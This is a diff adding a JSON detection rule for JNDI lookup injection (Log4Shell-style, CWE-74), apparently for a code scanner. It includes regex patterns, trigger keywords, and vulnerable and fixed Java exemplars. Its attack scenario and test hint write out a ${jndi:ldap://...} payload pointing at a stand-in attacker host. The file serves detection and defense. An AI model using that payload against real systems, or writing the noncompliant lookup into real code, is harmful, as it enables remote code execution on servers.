@@ -1,0 +1,36 @@
+{
+  "cwe_id": "CWE-74",
+  "name": "JNDI lookup injection (Log4Shell-style)",
+  "rank": 0,
+  "kev": false,
+  "task_triggers": [
+    "jndi",
+    "initialcontext",
+    "lookup",
+    "ldap",
+    "directory context",
+    "naming lookup",
+    "log4j",
+    "resource lookup"
+  ],
+  "patterns": [
+    {
+      "lang": "java",
+      "confidence": "high",
+      "re": "\\$\\{jndi:"
+    },
+    {
+      "lang": "java",
+      "confidence": "medium",
+      "re": "new\\s+InitialContext\\s*\\(\\s*\\)\\s*\\.lookup\\s*\\(",
+      "reject_re": "lookup\\s*\\(\\s*\""
+    }
+  ],
+  "attack_scenario": "Attacker supplies ldap://evil.com/a (or embeds ${jndi:ldap://evil.com/a} in logged input); the JVM fetches and instantiates the attacker's remote class, executing code.",
+  "negative_test_hint": ["log or look up the string \"${jndi:ldap://evil.example.com/a}\" and assert no outbound LDAP/RMI connection is attempted and the input is treated as data"],
+  "exemplar": {
+    "noncompliant": "Object ds = new InitialContext().lookup(userJndiName);",
+    "compliant": "Object ds = new InitialContext().lookup(\"java:comp/env/jdbc/AppDS\");",
+    "explanation": "A JNDI lookup on an attacker-controlled name (or a ${jndi:...} interpolation reaching a lookup, as in Log4Shell) lets the attacker point at a remote LDAP/RMI URL that returns a malicious object, yielding remote code execution. Only ever look up fixed, developer-defined literal names such as 'java:comp/env/jdbc/AppDS', never user-supplied input."
+  }
+}
